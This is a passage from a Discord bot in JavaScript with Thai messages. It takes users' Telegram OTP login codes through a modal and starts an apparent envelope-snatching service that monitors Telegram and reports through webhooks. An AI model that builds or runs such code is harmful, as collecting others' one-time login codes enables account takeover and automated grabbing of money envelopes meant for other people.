                await interaction.reply({ embeds: [new EmbedBuilder().setTitle('✅ บันทึก Webhook เรียบร้อยแล้ว').setDescription('**คุณจะได้รับการแจ้งเตือนเมื่อรับซองสำเร็จ**').setColor(SUCCESS).setTimestamp()], ephemeral: true });
            }

            if (customId === 'otp_modal') {
                const otpCode = interaction.fields.getTextInputValue('otp_input').trim();
                await interaction.deferReply({ ephemeral: true });
                
                const result = await startTelegram(user.id, otpCode);
                if (result === true) {
                    await interaction.editReply({ embeds: [new EmbedBuilder().setTitle('✅ เปิดระบบเรียบร้อยแล้ว').setDescription(`**ระบบดักซองกำลังทำงานแล้ว**\n⚡ ดักจาก Telegram!\n🔔 จะแจ้งเตือนผ่าน Webhook\n\n**ผู้ใช้งานปัจจุบัน:** ${telegramClients.size}/${config.maxUsers}`).setColor(SUCCESS).setTimestamp()] });
                } else {
                    await interaction.editReply({ embeds: [new EmbedBuilder().setTitle('❌ รหัส OTP ไม่ถูกต้อง').setDescription('**กรุณาลองใหม่อีกครั้ง**\nตรวจสอบให้แน่ใจว่ารหัส OTP ถูกต้อง').setColor(FAILED)] });
                }
            }
        }
    } catch (error) {
        console.error('[Error]', error);
        if (!interaction.replied && !interaction.deferred) {
            try {
                await interaction.reply({ content: 'เกิดข้อผิดพลาด กรุณาลองใหม่อีกครั้ง', ephemeral: true });
            } catch (e) {}
        }
    }
});

client.on('error', error => {});
process.on('unhandledRejection', (error) => {});
process.on('uncaughtException', (error) => {});

process.on('SIGINT', async () => {
    console.log('\n[System] กำลังปิดระบบ...');
    try {
        for (const [userId] of telegramClients) await stopTelegram(userId);
        db.syncBalanceToDisk();
        console.log('[System] ปิดระบบเรียบร้อย');
    } catch (error) {}
    process.exit(0);
});

if (!config.token || config.token === 'YOUR_BOT_TOKEN_HERE') {
    console.log('[Error] กรุณาใส่โทเค่นบอทใน bot_config.js');
    process.exit(1);
}

client.login(config.token).catch(err => {
    console.error('[Error] ไม่สามารถ Login ได้');
    process.exit(1);
});

console.log('[System] กำลังเข้าสู่ระบบ...');